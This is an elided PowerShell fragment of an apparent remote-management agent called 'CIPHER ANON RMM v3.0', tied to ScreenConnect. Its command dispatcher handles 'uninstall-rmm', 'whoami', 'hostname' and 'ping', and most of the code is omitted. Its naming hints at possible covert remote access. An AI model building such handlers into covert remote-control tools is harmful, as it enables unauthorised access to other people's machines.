# ============================================================
# CIPHER ANON RMM v3.0 — SCREENCONNECT ONLY (FIXED)
# ============================================================
...
function Execute-Command {
    ...
    try {
        ...
        elseif ($Command -like "uninstall-rmm") {
            try {
        ...
        elseif ($Command -like "whoami") {
            $result = $env:USERNAME
        }
        elseif ($Command -like "hostname") {
            $result = $env:COMPUTERNAME
        }
        elseif ($Command -like "ping") {
            $result = "pong"
        }
